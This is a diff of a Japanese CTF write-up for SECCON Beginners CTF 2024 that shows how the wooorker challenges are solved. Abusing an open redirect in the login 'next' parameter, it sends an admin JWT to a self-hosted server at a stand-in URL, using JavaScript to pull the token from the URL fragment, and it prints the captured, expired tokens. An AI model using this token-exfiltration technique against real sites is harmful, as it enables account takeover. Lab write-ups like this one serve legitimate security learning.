@@ -1,7 +1,7 @@
 ---
 title: SECCON Beginners CTF 2024 参加記
 tags:
-  - 'seccon'
+  - ''
 private: false
 updated_at: ''
 id: null
@@ -50,14 +50,24 @@ app.listen(port, () => {
   console.log(`Server is running on http://localhost:${port}`);
 });
 ```
-これと適当なpackage.jsonをレポジトリに保存して、デプロイする。
-デプロイにはRenderなどの無料サーバでデプロイする。
-ngrokやgithubのcodespacesを用いてデプロイした場合には、サーバにアクセスする前に確認画面が入るのでうまくいかない。
 
-デプロイしたサーバのURLを`https://example.com/`として、脆弱性報告botに`login?next=https://example.com/`と入力する。すると、サーバ上のターミナルからリクエストの内容を確認すると、
-`Received GET request for /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDUzNzAyLCJleHAiOjE3MTg0NTczMDJ9.LfQhIqEBemmwxSZfSCedaqpKa-SlT9yPOYsyj56M5V8`のように表示されている。(このtokenはすでに有効期限を過ぎている。)
+このコードとpackage.jsonをGitHubのレポジトリに保存します。
+
+その後、[Render](https://render.com/)という無料サーバを用いて、
+GitHubのレポジトリを指定して、サーバを立ち上げます。
+
+ngrokやgithubのcodespacesを用いてサーバを立ち上げた場合には、サーバにアクセスする前に確認画面が入るのでうまくいきませんでした。
+
+Render上で立ち上げたサーバのURLを取得します。(以下では`https://example.com/`としています。)
+
+脆弱性報告botに`login?next=https://example.com/`と入力します。その後、Render上のサーバのターミナルの出力を見て、受信したリクエストの内容を確認すると、
+```
+Received GET request for /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDUzNzAyLCJleHAiOjE3MTg0NTczMDJ9.LfQhIqEBemmwxSZfSCedaqpKa-SlT9yPOYsyj56M5V8
+```
+のように表示されているはずです。(このtokenは私が獲得した時のもので、すでに有効期限を過ぎています。)
+
 このtokenを使って`https://wooorker.beginners.seccon.games/?token=******`
-にアクセスするとフラグを取得できる。
+にアクセスするとフラグを取得できます。
 
 ### フラグ
 
@@ -67,10 +77,14 @@ ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}
 
 ### 解法
 
-woooker1の時に構築したサーバを少し改変する。
-前回はクエリパラメータにtokenを含んだ状態でリクエストが
-送られていたが、今回はフラグメントにtokenが含まれている。ですので、リクエストを受け取るサーバにおいてはtokenの情報にアクセスできない。クライアントサイドでJavascriptを実行してtokenをサーバ側に再送する処理を行う。サーバのコードは以下のようになる。
-デプロイしたサーバのURLは`https://example.com/`としている。
+woooker1の時に構築したサーバを少し改変します。
+
+前回はクエリパラメータ(`?`以降の部分)にtokenを含んだ状態でリクエストが送られていましたが、今回はフラグメント(`#`以降の部分)にtokenが含まれています。
+Render上のサーバが受け取るリクエストにはtokenの情報は含まれていません。リスポンスでJavascriptを含むHTMLを送り、SECCONサーバサイドでJavascriptを実行して、フラグメント部分にあるtokenをRender上のサーバ側に送信する処理を行うように試みます。
+
+サーバのコードは以下のようになります。
+
+Render上のサーバのURLは先ほど同様`https://example.com/`としています。
 
 ```javascript:server.js
 const express = require('express');
@@ -107,11 +121,13 @@ app.listen(port, () => {
 });
 ```
 
-これによりサーバ上で以下のようにtokenが受け取れる(このtokenはすでに有効期限を過ぎている。)
-`Received token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDcyODI4LCJleHAiOjE3MTg0NzY0Mjh9.yAxwfpt9eU6jJ2E4YofnvRS07FSGSCCRQQB9nmZ161w`
+これによりRender上のサーバで以下のようにtokenが受け取れます。(このtokenは私が獲得した時のもので、すでに有効期限を過ぎています。)
+```
+Received token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDcyODI4LCJleHAiOjE3MTg0NzY0Mjh9.yAxwfpt9eU6jJ2E4YofnvRS07FSGSCCRQQB9nmZ161w
+```
 
 このtokenを使って`https://wooorker2.beginners.seccon.games/?token=******`
-にアクセスするとフラグを取得できる。
+にアクセスするとフラグを取得できます。
 
 ### フラグ
 
